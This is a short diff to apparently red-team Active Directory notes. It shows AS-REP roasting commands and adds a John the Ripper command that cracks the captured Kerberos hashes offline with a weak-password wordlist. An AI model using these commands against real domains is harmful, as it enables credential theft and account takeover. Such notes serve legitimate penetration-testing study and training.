@@ -148,3 +148,13 @@ Get-ASREPHash -UserName VPN1user -Verbose
 ```powershell
 Invoke-ASREPRoast -Verbose
 ```
+
+
+- We can use John The Ripper to brute-force the hashes offline
+
+```powershell
+john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-
+pass.txt C:\AD\Tools\asrephashes.txt
+```
+
+
